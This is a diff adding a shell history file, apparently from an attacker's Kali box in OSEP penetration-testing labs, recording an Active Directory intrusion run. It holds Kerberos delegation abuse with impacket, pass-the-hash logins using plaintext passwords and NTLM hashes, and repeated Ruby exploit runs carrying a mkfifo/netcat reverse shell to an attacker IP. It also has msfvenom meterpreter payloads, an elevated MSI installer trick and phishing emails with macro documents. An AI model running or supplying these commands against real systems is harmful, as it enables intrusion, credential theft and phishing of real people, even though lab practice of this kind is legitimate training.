@@ -1,0 +1,2290 @@
+xfreerdp /v:172.16.227.167 /u:offsec /p:Abc123! /w:1200 /h:700
+xfreerdp /v:172.16.227.166 /u:offsec /p:Abc123! /w:1200 /h:700
+evil-winrm -i 172.16.227.166 -u complyedge\\jim -H e48c13cefd8f9456d79cd49651c134e8
+mkdir rbcd
+find / -name addcomputer.py  2>/dev/null
+cp /usr/share/doc/python3-impacket/examples/addcomputer.py .
+find / -name rbcd.py  2>/dev/null
+cp /usr/share/doc/python3-impacket/examples/rbcd.py .
+cp /home/parallels/OSEP/lab5/getST.py .
+ping ops.comply.com
+python3 ./addcomputer.py complyedge.com/jim -hashes :e48c13cefd8f9456d79cd49651c134e8 -computer-name myComputer$ -computer-pass h4x -dc-ip 172.16.227.165
+python3 ./rbcd.py -delegate-to jump09$ -delegate-from myComputer$ -dc-ip 172.16.227.165 OPS.COMPLY.COM/file06$ -hashes :7f0d7b7eaa76e00d4b677152cca3da6f -action write
+python3 ./getST.py -spn cifs/jump09 -dc-ip 172.16.227.165 -impersonate Administrator  ops.comply.com/myComputer:h4x
+impacket-psexec ops.comply.com/administrator@ops.comply.com -k -no-pass
+impacket-psexec ops.comply.com/administrator@cdc07.ops.comply.com -k -no-pass
+impacket-psexec ops.conmly.com/administrator@jump09.ops.comply.com -k -no-pass
+impacket-psexec ops.comply.com/administrator@jump09.ops.comply.com -k -no-pass
+impacket-psexec -k -no-pass jump09.comply.com -debug -dc-ip 172.16.227.165 
+impacket-psexec -k -no-pass jump09.ops.comply.com -debug -dc-ip 172.16.227.165 
+impacket-psexec -k -no-pass administrator@jump09.ops.comply.com -debug -dc-ip 172.16.227.165 
+impacket-psexec -k -no-pass administrator@ops.comply.com -debug -dc-ip 172.16.227.165 -ts
+find / -name psexec.py  2>/dev/null
+cp /home/parallels/OSEP/lab5/ticket/psexec.py .
+python3 psexec.py OPS.COMPLY.COM/administrator@junp09.ops.comply.com -k -no-pass
+python3 ./psexec.py -k -no-pass administrator@jump09.ops.comply.com
+sudo apt install ntpdate
+sudo ntpdate -u ps.comply.com
+impacket-psexec -k -no-pass administrator@jump09.ops.comply.com -debug -dc-ip 172.16.227.165 -ts
+python3 psexec.py administrator@jump09.ops.comply.com -k -no-pass
+python3 psexec.py administrator@jump09 -k -no-pass
+python3 psexec.py administrator@jump09.ops.comply.com -k -no-pass -dc-ip 192.168.227.165
+python3 psexec.py administrator@jump09.ops.comply.com -k -no-pass -dc-ip 172.16.227.165
+find / -name wmiexec.py  2>/dev/null
+cp /usr/share/doc/python3-impacket/examples/wmiexec.py .
+python3 ./wmiexec.py -k -no-pass administrator@jump09.ops.comply.com
+python3 ./wmiexec.py -k -no-pass jump09.ops.comply.com
+python3 ./wmiexec.py -k -no-pass ops.comply.com
+klist tgt
+file Administrator@cifs_jump09@OPS.COMPLY.COM.ccache
+cat Administrator@cifs_jump09@OPS.COMPLY.COM.ccache
+impacket-psexec -k -no-pass -target-ip 172.16.227.165 -spn cifs/ju
+impacket-psexec -k -no-pass -target-ip 172.16.227.165 -spn cifs/jump09
+python3 psexec.py OPS.COMPLY.COM/administrator@jump09 -k -no-pass
+python3 psexec.py OPS.COMPLY.COM/administrator@jump09.ops.comply.com -k -no-pass
+impacket-psexec -k -no-pass -target-ip 172.16.227.165 -spn cifs/jump09 -ticket Administrator@cifs_jump09@OPS.COMPLY.COM.ccache\
+
+impacket-psexec -k -no-pass Administrator@jump09.ops.comply.com "ipconfig"
+impacket-psexec -k -no-pass Administrator@jump09.ops.comply.com
+sudo ntpdate -u jump09.ops.comply.com
+sudo ntpdate -u ops.comply.com
+rm *.ccach
+python3 ./getST.py -spn cifs/jump09.ops.comply.com -dc-ip 172.16.227.165 -impersonate Administrator ops.comply.com/myComp$uter:h4x\
+
+touch Administrator@cifs_jump09.ops.comply.com@OPS.COMPLY.COM.ccache
+python3 ./getST.py -spn cifs/jump09.ops.comply.com -dc-ip 172.16.227.165 -impersonate Administrator ops.comply.com/myComputer:h4x
+mkdir ST
+cd ../rbcd
+cp *.py ../ST
+cd ../ST
+python3 ./addcomputer.py complyedge.com/jim -hashes :e48c13cefd8f9456d79cd49651c134e8 -computer-name Attacker$ -computer-pass h4x -dc-ip 172.16.227.165\
+
+python3 ./rbcd.py -delegate-to jump09$ -delegate-from Attacker$ -dc-ip 172.16.227.165 OPS.COMPLY.COM/file06$ -hashes :bf3bd7e44db3236ff133687c4ffe0a8b -action write
+python3 ./rbcd.py -delegate-to jump09$ -delegate-from Attacker$ -dc-ip 172.16.227.165 OPS.COMPLY.COM/file06$ -hashes :7f0d7b7eaa76e00d4b677152cca3da6f -action write\
+
+ping junp09$
+ping jump09$
+sudo ip route add 172.16.227.0/24 dev ligolo
+rm *.ccache
+python3 ./addcomputer.py complyedge.com/jim -hashes :e48c13cefd8f9456d79cd49651c134e8 -computer-name myComputer$ -computer-pass h4x -dc-ip 172.16.227.165\
+
+python3 ./rbcd.py -delegate-to jump09$ -delegate-from myComputer$ -dc-ip 172.16.227.165 OPS.COMPLY.COM/file06$ -hashes :7f0d7b7eaa76e00d4b677152cca3da6f -action write\
+
+python3 ./getST.py -spn cifs/jump09.ops.comply.com -dc-ip 172.16.227.165 -impersonate Administrator ops.comply.com/myComputer
+ls -ld /home/parallels/OSEP/lab5/rbcd/
+export KRB5CCNAME=/tmp/Administrator@cifs_jump09.ops.comply.com@OPS.COMPLY.COM.ccache
+unset KRB5CCNAME
+python3 ./getST.py -spn cifs/jump09.ops.comply.com -dc-ip 172.16.227.165 -impersonate Administrator ops.comply.com/myComputer:h4x\
+
+psexec.py -k -dc-ip 172.16.227.165 jump09.ops.comply.com/Administrator
+./psexec.py -k -dc-ip 172.16.227.165 jump09.ops.comply.com/Administrator
+python3 ./psexec.py -k -dc-ip 172.16.227.165 jump09.ops.comply.com/Administrator
+ping jump09.ops.comply.com\ 
+python3 ./psexec.py -k -dc-ip 172.16.227.165 Administrator@jump09.ops.comply.com
+pip3 install --upgrade impacket\
+
+python3 ./psexec.py -k -dc-ip 172.16.227.165 Administrator@jump09.ops.comply.com -no-pass
+python3 ./getST.py -spn cifs/jump09.ops.comply.com -impersonate Administrator ops.comply.com/myComputer:h4x
+python3 ./getST.py -spn cifs/jump09.ops.comply.com -impersonate Administrator 'ops.comply.com/myComputer:h4x'
+impacket-psexec administrator@cifs_jump09.ops.comply.com -k -no-pass
+impacket-psexec administrator@jump09.ops.comply.com -k -no-pass
+python3 ./psexec.py -k  Administrator@jump09.ops.comply.com -no-pass
+ssh root@192.168.227.164
+ping 192.168.227.164\
+
+cd osep/lab5
+cd ../lab5/ligolo-ng_agent_0.7.5_linux_amd64
+cd ../ligolo-ng_agent_0.7.5_linux_amd64
+CLEAR
+ruby exploit.rb exploit http://192.168.227.164/ 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.159 4444 >/tmp/f'\
+
+python3 ./addcomputer.py complyedge.com/jim -hashes :e48c13cefd8f9456d79cd49651c134e8 -computer-name Attacker$ -computer-pass h4x -dc-ip 172.16.172.165\
+
+python3 ./rbcd.py -delegate-to jump09$ -delegate-from Attacker$ -dc-ip 172.16.172.165 OPS.COMPLY.COM/file06$ -hashes :bf3bd7e44db3236ff133687c4ffe0a8b -action write\
+
+ifconfig
+xfreerdp /v:172.16.172.166 /u:offsec /p:Abc123! /w:1200 /h:700
+python3 ./rbcd.py -delegate-to jump09$ -delegate-from myComputer$ -dc-ip 172.16.172.165 OPS.COMPLY.COM/file06$ -hashes :7f0d7b7eaa76e00d4b677152cca3da6f -action write
+python3 ./getST.py -spn cifs/jump09 -dc-ip 172.16.227.165 -impersonate Administrator ops.comply.com/myComputer:h4x\
+
+export KRB5CCNAME=/home/parallels/OSEP/lab5/rbcd/Administrator@cifs_jump09@OPS.COMPLY.COM.ccache
+python3 ./psexec.py -k -no-pass administrator@jump09
+ping jump09.ops.comply.com
+python3 ./psexec.py -k -no-pass administrator@jump09.ops.comply.com -debug -dc-ip 172.16.227.165
+python3 ./psexec.py -k -no-pass administrator@jump09.ops.comply.com -debug -dc-ip 172.16.127.165
+python3 ./rbcd.py -delegate-to jump09$ -delegate-from myComputer$ -dc-ip 172.16.172.165 OPS.COMPLY.COM/file06$ -hashes :7f0d7b7eaa76e00d4b677152cca3da6f -action write\
+
+python3 ./getST.py -spn cifs/jump09 -dc-ip 172.16.172.165 -impersonate Administrator ops.comply.com/myComputer:h4x\
+
+python3 ./psexec.py -k -no-pass administrator@jump09 -debug -dc-ip 172.16.172.165
+python3 ./psexec.py -k -no-pass administrator@jump09.ops.comply.com -debug -dc-ip 172.16.172.165
+crackmapexec smb 172.16.172.165 -k --ticket=/home/parallels/OSEP/lab5/rbcd/Administrator@cifs_jump09@OPS.COMPLY.COM.ccache -x "ipconfig"
+crackmapexec smb 172.16.172.165  -k --ticket=/home/parallels/OSEP/lab5/rbcd/Administrator@cifs_jump09@OPS.COMPLY.COM.ccache -x "whoami"\
+
+crackmapexec -h
+crackmapexec smb -h
+crackmapexec smb 172.16.172.165  -k  --use-kcache   -x "whoami"
+python3 ./getST.py -spn cifs/jump09.ops.comply.com -dc-ip 172.16.172.165 -impersonate Administrator ops.comply.com/myComputer:h4x\
+
+export KRB5CCNAME=/home/parallels/OSEP/lab5/rbcd/Administrator@cifs_jump09.ops.comply.com@OPS.COMPLY.COM.ccache
+crackmapexec smb 172.16.172.167  -k  --use-kcache   -x "whoami"
+python3 ./addcomputer.py complyedge.com/jim -hashes :e48c13cefd8f9456d79cd49651c134e8 -computer-name myComputer$ -computer-pass h4x -dc-ip 172.16.172.165\
+
+python3 ./rbcd.py -delegate-to jump09$ -delegate-from myComputer$ -dc-ip 172.16.172.165 OPS.COMPLY.COM/file06$ -hashes :bf3bd7e44db3236ff133687c4ffe0a8b -action write
+evil-winrm -i 172.16.172.166 -u complyedge\\jim -H e48c13cefd8f9456d79cd49651c134e8
+cd ligolo-ng_agent_0.7.5_linux_amd64
+cp agent ../
+ruby exploit.rb exploit http://192.168.218.164/ 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.195 4444 >/tmp/f'\
+
+ping 192.172.164
+ping 192.168.218.164\
+
+ping 192.168.172.164\
+
+cear
+ruby exploit.rb exploit http://192.168.172.164/ 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.195 4444 >/tmp/f'\
+
+p a
+ping 192.168.211.164
+xfreerdp /v:172.16.219.166 /u:complyedge\jim /pth:00000000000000000000000000000000:e48c13cefd8f9456d79cd49651c134e8 
+[200~xfreerdp /v:172.16.219.166 /u:offsec /p:Abc123! /w:1200 /h:700~
+xfreerdp /v:172.16.219.166 /u:offsec /p:Abc123! /w:1200 /h:700
+xfreerdp /v:172.16.172.167 /u:offsec /p:Abc123! /w:1200 /h:700
+xfreerdp /v:172.16.219.167 /u:offsec /p:Abc123! /w:1200 /h:700
+xfreerdp /v:172.16.219.165 /u:pete /p:0998ASDaas2 /w:1200 /h:700
+ruby exploit.rb exploit http://192.168.219.164/ 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.158 4444 >/tmp/f'\
+
+nxc smb hosts -u pete -p 0998ASDaas2 -d ops.comply.com
+evil-winrm -i 172.16.219.167 -u pete -p 0998ASDaas2  -d ops.comply.com
+evil-winrm -i 172.16.219.167 -u ops.comply.com\pete -p 0998ASDaas2
+nxc winrm hosts -u pete -p 0998ASDaas2 -d ops.comply.com
+evil-winrm -i 172.16.219.165 -u ops.comply.com\pete -p 0998ASDaas2
+evil-winrm -i 172.16.219.166 -u ops.comply.com\pete -p 0998ASDaas2
+evil-winrm -i 172.16.219.166 -u ops.comply.com\\pete -p 0998ASDaas2
+evil-winrm -i 172.16.219.167 -u ops.comply.com\\pete -p 0998ASDaas2
+evil-winrm -i 172.16.219.165 -u ops.comply.com\\pete -p 0998ASDaas2
+evil-winrm -i 172.16.219.254 -u ops.comply.com\\pete -p 0998ASDaas2
+ping 172.167.219.192
+ping 172.167.219.188
+ping 172.16.219.188
+ping 172.16.219.192
+nmap -iL hosts -sV -T4 -oN scan_results.txt
+cat scan_results.txt
+nmap -h
+nmap -iL hosts -sT -T4 -oN scan_results.txt
+mkdir nmap
+sudo nmap -p -sT -vv 172.16.219.180 -oN nmap/nmap-tcp-180.txt -Pn
+sudo nmap -p- -sT -vv 172.16.219.180 -oN nmap/nmap-tcp-180.txt -Pn
+sudo nmap -p1-5000 -sT -vv 172.16.219.180 -oN nmap/nmap-tcp-180.txt -Pn
+bloodhound-python -d final.com -c all -u nina -p Passoword123! -ns 172.16.219.180 --dns-tcp
+impacket-psexec nina@172.16.219.183 
+impacket-psexec nina@172.16.219.183
+chmod +x id_rsa
+chmod 600id_rsa
+ping 172.16.219.180
+ping 172.16.219.184
+sudo ip route del 172.16.219.0/24
+sudo ip route add 172.16.219.0/24 dev ligolo2
+ssh -i id_rsa final\\tommy@172.16.219.184
+mkdir lab6
+ping 192.168.219.181
+xfreerdp /v:192.168.219.183 /u:offsec /p:Abc123! /w:1200 /h:700
+xfreerdp /v:192.168.219.181 /u:offsec /p:Abc123! /w:1200 /h:700
+sudo ip route add 172.16.211.0/24 dev ligolo
+python3 ./addcomputer.py complyedge.com/jim -hashes :e48c13cefd8f9456d79cd49651c134e8 -computer-name myComputer$ -computer-pass h4x -dc-ip 172.16.211.165
+python3 ./rbcd.py -delegate-to jump09$ -delegate-from myComputer$ -dc-ip 172.16.211.165 OPS.COMPLY.COM/file06$ -hashes :7f0d7b7eaa76e00d4b677152cca3da6f -action write\
+
+python3 ./getST.py -spn cifs/jump09.ops.comply.com -dc-ip 172.16.211.165 -impersonate Administrator ops.comply.com/myComputer:h4x
+impacket-psexec -k 'ops.comply.com'/'Administrator'@jump09.ops.comply.com -no-pass\
+
+sudo ip route del 172.16.219.0/24 dev ligolo\
+
+sudo ip route del 172.16.219.0/24 dev ligolo
+sudo ip route add 172.16.219.0/24 dev ligolo
+nxc smb hosts -u jim -H aad3b435b51404eeaad3b435b51404ee:e48c13cefd8f9456d79cd49651c134e8 -d complyedge.com
+evil-winrm -i 172.16.219.166 -u complyedge\\jim -H e48c13cefd8f9456d79cd49651c134e8\
+
+ruby exploit.rb exploit http://192.168.211.164/ 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.154 4444 >/tmp/f'\
+
+cd OpenNetAdmin-RCE
+vim cmd.aspx
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.158 lport=4444 -f aspx
+xfreerdp /v:172.16.219.183 /u:nina /p:Password123! /w:1200 /h:700
+ping 172.16.219.183
+ping jump03
+ping jump03.final.om
+ping jump03.final.com
+cd lab5
+cp ./proxy ../lab6
+cleawr
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.173 LPORT=443 -f csharp 
+mkdir printspoofer
+cd ../../lab2
+cp SpoolSample.exe ../lab6/printspoofer
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.173 LPORT=443 -f csharp
+cd OSEP/lab2
+cp PrintSpooferNet.exe ../lab6/printspoofer
+ps aux | grep 4444
+ss -luntp | grep 4444
+xfreerdp /v:192.168.140.100 /u:administrator /p:lab /w:1200 /h:700
+xfreerdp /v:192.168.140.183 /u:offsec /p:lab123! /w:1200 /h:700
+ping 192.168.140.181
+cd printspoofer
+ping 172.16.140.180
+cd XORshell_PrintSpoofer
+cp ~/OSEP/lab6/printspoofer/SpoolSample.exe .
+cp ~/OSEP/lab6/printspoofer/PrintSpooferNet.exe .
+git commit -m "submit the two files"
+xfreerdp /v:192.168.140.183 /u:offsec /p:Abc123! /w:1200 /h:700
+xfreerdp /v:172.16.140.183 /u:offsec /p:Abc123! /w:1200 /h:700
+xfreerdp /v:172.16.140.183 /u:final\nina /p:Abc123! /w:1200 /h:700
+xfreerdp /v:172.16.140.183 /u:nina /p:Abc123! /w:1200 /h:700
+cat domain-users-jump03.txt
+cat domain-users-jump03.txt | grep web06
+cat domain-users-jump03.txt | grep web
+cat domain-users-jump03.txt | grep WEB
+cd OSEP/lab5
+cd ~/.ssh
+cp id_rsa ~/OSEP/lab6
+cd ../lab6
+sudo ip route add 172.16.140.0/24 dev ligolo2
+sshuttle -v -e "ssh -i id_rsa" -r root@172.16.140.197 172.16.140.0/24
+ping 172.16.140.183
+ping 172.16.140.197
+ssh -i id_rsa root@172.16.140.197
+find / -name nc*.exe  2>/dev/null
+impacket-psexec nina@172.16.140.183
+ssh  root@172.16.140.197
+cd lab3
+cd lab2
+cd ../lab2
+find / -name run.txt  2>/dev/null
+cd /home/parallels/OSEP/lab4
+cp run.txt ~/OSEP/lab6
+cp amsibypass.ps1 ~/OSEP/lab6
+cat run.txt
+vim run.txt
+xfreerdp /v:192.168.140.181 /u:offsec /p:Abc123! /w:1200 /h:700
+xfreerdp /v:192.168.140.194 /u:offsec /p:Abc123! /w:1200 /h:700
+xfreerdp /v:172.16.140.194 /u:administrator /pth:f99529e42ee77dc4704c568ba9320a34 +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore
+cd ~/OSEP/lab6
+find / -name PowerUpSQL  2>/dev/null
+find / -name PowerUpSQL*  2>/dev/null
+cp /home/parallels/OSEP/lab2/PowerUpSQL.ps1 .
+./agent.exe -connect 192.168.45.173:11601 -ignore-cert -retry -v\
+
+sudo ip route add 172.16.140.0/24 dev ligolo
+cd lab6
+ssh -i id_rsa final\\tommy@172.16.140.184
+xfreerdp /v:172.16.157.188 /u:administrator /pth:8388d07604009d14cbb78f7d37b9e887 +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore
+xfreerdp /v:172.16.157.187 /u:administrator /pth:8388d07604009d14cbb78f7d37b9e887 +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore
+mousepad
+xfreerdp /v:172.16.157.194 /u:administrator /pth:f99529e42ee77dc4704c568ba9320a34 +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore
+impacket-psexec -hashes :8388d07604009d14cbb78f7d37b9e887 administrator@172.16.157.188\
+
+vim sql03.log
+nxc winrm 172.16.157.188 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8388d07604009d14cbb78f7d37b9e887
+cat sql03.log
+nxc -h
+nxc mssql 172.16.157.188 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8388d07604009d14cbb78f7d37b9e887
+nxc rdp 172.16.157.188 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8388d07604009d14cbb78f7d37b9e887
+nxc smb 172.16.157.188 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8388d07604009d14cbb78f7d37b9e887
+evil-winrm -i 172.16.157.188 -u administrator -H 8388d07604009d14cbb78f7d37b9e887
+nxc smb 172.16.157.188 -u setup -H aad3b435b51404eeaad3b435b51404ee:1fd7eecf8c3c358597ffe32797ed01e9
+Impacket-mssqlclient SQL11/Administrator@192.168.157.188 -windows-auth  -hashes :8388d07604009d14cbb78f7d37b9e887
+impacket-mssqlclient SQL11/Administrator@192.168.157.188 -windows-auth  -hashes :8388d07604009d14cbb78f7d37b9e887\
+
+impacket-mssqlclient SQL11/Administrator@172.16.157.188 -windows-auth  -hashes :8388d07604009d14cbb78f7d37b9e887\
+
+winrm smb 172.16.157.188 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8388d07604009d14cbb78f7d37b9
+crackmapexec smb 172.16.157.188 -u "administartor" -H "8388d07604009d14cbb78f7d37b9e887"
+nxc winrm 172.16.157.188 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8388d07604009d14cbb78f7d37b9e887\
+
+impacket-mssqlclient SQL11/Administrator@172.16.157.188 -windows-auth  -hashes :8388d07604009d14cbb78f7d37b9e887
+impacket-psexec -hashes 00000000000000000000000000000000:8388d07604009d14cbb78f7d37b9e887 Administrator@172.16.157.188\
+
+nxc smb 172.16.157.188 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8388d07604009d14cbb78f7d37b9e887\
+
+ping 172.16.157.188
+ping 192.168.157.181
+sudo ip route add 172.16.157.0/24 dev ligolo\
+
+ssh -i id_rsa final\\tommy@172.16.157.184\
+
+ping 172.16.157.183
+ping 172.16.157.187
+impacket-psexec -hashes :1d4c153225b424290188504b9e0541eb administrator@172.16.235.180
+impacket-psexec -hashes :1d4c153225b424290188504b9e0541eb tina@172.16.235.180
+ping 192.168.137.120
+cat hello.txt
+cat file.txt
+sudo ip route add 172.16.235.0/24 dev ligolo
+cd .ss
+cd .ssh
+ssh -i id_rsa final\\tommy@172.16.235.184
+cd OSEP/lab6
+ssh  root@172.16.235.197 
+ssh  -i id_rsa root@172.16.235.197 
+impacket-psexec -hashes :8388d07604009d14cbb78f7d37b9e887 administrator@172.16.157.188
+nxc smb 172.16.235.188 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8388d07604009d14cbb78f7d37b9e887
+nxc smb 172.16.157.188 -u Administrator -H :8388d07604009d14cbb78f7d37b9e887
+nxc smb 172.16.235.188 -u Administrator -H :8388d07604009d14cbb78f7d37b9e887\
+
+impacket-psexec -hashes :8388d07604009d14cbb78f7d37b9e887 administrator@172.16.235.188
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.170 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'abc123'\
+
+cd bypass
+evil-winrm -i 192.168.137.120 -u administrator -p f1{ann.c21/zRj
+ping 192.168.137.121
+xfreerdp /cert-ignore  /u:administrator /p:'f1{ann.c21/zRj' /v:192.168.137.121 /w:1200 /h:800
+xfreerdp /v:192.168.137.100 /u:administrator /p:lab /w:1200 /h:700
+nc -lvnp 44444
+ping 192.168.231.120
+xfreerdp /cert-ignore  /u:administrator /p:'f1{ann.c21/zRj' /v:192.168.231.121 /w:1200 /h:800
+32
+[18:45:44:309] [2848:2849] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[18:45:44:333] [2848:2849] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[18:45:44:333] [2848:2849] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+[18:45:45:339] [2848:2849] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
+[18:54:01:117] [2848:2876] [WARN][com.freerdp.client.x11] - failed to get clipboard data in format UTF8_STRING [source format CF_UNICODETEXT]
+[18:54:01:137] [2848:2876] [WARN][com.freerdp.client.x11] - failed to get clipboard data in format UTF8_STRING [source format CF_UNICODETEXT]
+[18:54:08:485] [2848:2876] [WARN][com.freerdp.client.x11] - failed to get clipboard data in format UTF8_STRING [source format CF_UNICODETEXT]
+[18:54:16:117] [2848:2876] [WARN][com.freerdp.client.x11] - failed to get clipboard data in format UTF8_STRING [source format CF_UNICODETEXT]
+[18:54:16:138] [2848:2876] [WARN][com.freerdp.client.x11] - failed to get clipboard data in format UTF8_STRING [source format CF_UNICODETEXT]
+[18:54:26:787] [2848:2876] [WARN][com.freerdp.client.x11] - failed to get clipboard data in format UTF8_STRING [source format CF_UNICODETEXT]
+[19:12:49:383] [2848:2849] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 110: Connection timed out
+[19:12:49:383] [2848:2849] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
+[19:12:49:383] [2848:2849] [INFO][com.freerdp.client.common] - Network disconnect!
+âƒ´ƒ¬âƒ´€âƒ´€(parallelsãƒ©¿kali-linux-2024-2)-[~/OSEP]
+âƒ´ƒ´âƒ´€$ 
+evil-winrm -i 192.168.231.120 -u administrator -H 5f9163ca3b673adfff2828f368ca3760
+xfreerdp /cert-ignore  /u:offsec /p:'Abc123!' /v:192.168.124.140 /w:1200 /h:800
+ping 192.168.124.140\
+
+impacket-mssqlclient webapp11@192.168.124.100
+impacket-mssqlclient offsec@192.168.124.141 
+mkdir lab7
+mkdir web
+vim test.hta
+sudo nmap -p- --open -sCV --min-rate=2000 192.168.124.201 -oN nmap-tcp-web03.txt -Pn
+ping  192.168.124.80
+xfreerdp /cert-ignore  /u:administrator /p:'lab' /v:192.168.124.80 /w:1200 /h:800
+xfreerdp /cert-ignore  /u:administrator /p:'lab' /v:192.168.124.80 /w:1200 /h:700
+xfreerdp /cert-ignore  /u:offsec /p:'Abc123!' /v:192.168.124.50 /w:1200 /h:700
+xfreerdp /cert-ignore  /u:offsec /p:'Abc123!' /v:172.16.124.50 /w:1200 /h:700
+cd /home/parallels/OSEP/lab
+cp amsibypass.ps1 ~/OSEP/lab7/web
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.170 lport=4444 -f msi -o reverse.msi
+sudo apt install wixl
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.170 lport=4444 -f exe -o shell.exe
+wixl -v options.wsx -o alwaysInstallElevated.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.170 LPORT=443 -f msi > rev.msi
+vim options.wsx
+sendemail -f john@tricky.com -t jobs@cowmotors-int.com -u 'appliacation jobs' -m "http://192.16.170/Doc1.docm" -s 192.168.124.201:25 -vvv 
+touch body.txt
+sudo swaks -t jobs@cowmotors-int.com  --from maildmz@relia.com -ap --attach @Doc1.docm --server 192.168.124.201 --body @body.txt --header "Subject: Appliactions" --suppress-data
+sudo swaks -t jobs@cowmotors-int.com --from a@cowmotors-int.com --attach @Doc1.docm --server 192.168.124.201 --body "Open Me" --header "Subject: View my Macro" --suppress-data
+sudo swaks -t jobs@cowmotors-int.com --from a@cowmotors-int.com --attach 2Doc1docm --server 192.168.124.201 --body "Open Me" --header "Subject: View my Macro" --suppress-data
+sudo swaks -t jobs@cowmotors-int.com --from a@cowmotors-int.com --attach @Doc2.doc --server 192.168.124.201 --body "Open Me" --header "Subject: View my Macro" --suppress-data
+sendEmail -f a@cowmotors-int.com -t obs@cowmotors-int.com -u "Open me" -m "Application" -a Doc2.doc -s 192.168.124.201 -v\
+
+sendmail -h
+sendEmail -f a@cowmotors-int.com -t obs@cowmotors-int.com -u "Open me" -m "Application" -a Doc2.doc -s 192.168.124.201:25 -v
+sendEmail -f a@cowmotors-int.com -t obs@cowmotors-int.com -u "Open me" -m "Application" -a Doc2.doc -s 192.168.124.201:25 -vvv
+sendemail -f john@tricky.com -t jobs@cowmotors-int.com -u 'appliacation jobs' -m "http://192.168.45.170/test.hta" -s 192.168.124.201:25 -vvv 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.170 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'abc123'
+sendEmail -f a@cowmotors-int.com -t jobs@cowmotors-int.com -u "Open me" -m "Application" -a Doc2.doc -s 192.168.124.201:25 -vvv\
+
+sudo swaks -t jobs@cowmotors-int.com --from a@cowmotors-int.com --attach @Doc2.doc --server 192.168.124.201 --body "Open Me" --header "Subject: View my Macro" --suppress-data\
+
+sendEmail -f a@cowmotors-int.com -t jobs@cowmotors-int.com -u "Open me" -m "Application" -a Doc3.doc -s 192.168.124.201:25 -vvv
+sudo swaks -t jobs@cowmotors-int.com  --from maildmz@relia.com -ap --attach @Doc3.doc --server 192.168.124.201 --body @body.txt --header "Subject: Appliactions" --suppress-data\
+
+sudo swaks -t jobs@cowmotors-int.com --from a@cowmotors-int.com --attach @Doc3.doc --server 192.168.124.201 --body "Open Me" --header "Subject: View my Macro" --suppress-data
+sendemail -f john@cowmotors-int.com -t jobs@cowmotors-int.com -s 192.168.124.201 -u "Application - Curriculum Vitae" -m "Attached" -a Doc3.doc
+sendemail -f john@cowmotors-int.com -t jobs@cowmotors-int.com -s 192.168.124.201 -u "Application - Curriculum Vitae" -m "Attached" -a Doc3.doc -vvv
+rm Doc1.docm
+mv Doc3.doc CV.doc
+sendEmail -h
+sendemail -f john@cowmotors-int.com -t jobs@cowmotors-int.com -s 192.168.124.201 -u "Application - Curriculum Vitae" -m "Attached" -a CV.doc -vvv
+rm Doc2.doc
+rm test.hta
+cd ../lab
+cp run.ps1 ../lab7
+mv run.ps1
+mv run.ps1 web
+gobuster dir -u http://192.168.124.200 -w /usr/share/wordlists/dirb/common.txt -t 64 2>/dev/null
+dirsearch -u http://192.168.216.89 -w /usr/share/wordlists/dirb/common.txt -t 256
+dirsearch -u http://192.168.216.89 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 256
+dirsearch -u http://192.168.124.200 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 256
+sudo nmap -p- --open -sCV --min-rate=2000 192.168.124.200 -oN nmap-tcp-200.txt -Pn
+smbclient
+smbclient -L 192.168.124.200
+find / -name Invoke-Mimikatz.ps1  2>/dev/null
+cd /home/parallels/OSEP/lab6
+cp proxy ~/OSEP/lab7
+sudo ip route add 172.16.45.0/24 dev ligolo
+ping  172.16.45.50
+sudo ip route add 172.16.124.0/24 dev ligolo
+ping  172.16.124.50
+evil-winrm -i 192.168.124.50 -u offsec -p Abc123!
+evil-winrm -i 172.16.124.50 -u offsec -p Abc123!
+sudo ip route add 172.16.231.0/24 dev ligolo
+gobuster dir -u http://172.16.231.221 -w /usr/share/wordlists/dirb/common.txt -t 64 2>/dev/null
+nxc smb 172.16.231.221 -u Administrator -H :ed24fcb9e3b90bf35eab10161b31c0de
+smbclient -L 172.16.231.221
+gobuster dir -u http://172.16.231.221 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64  2>/dev/null\
+
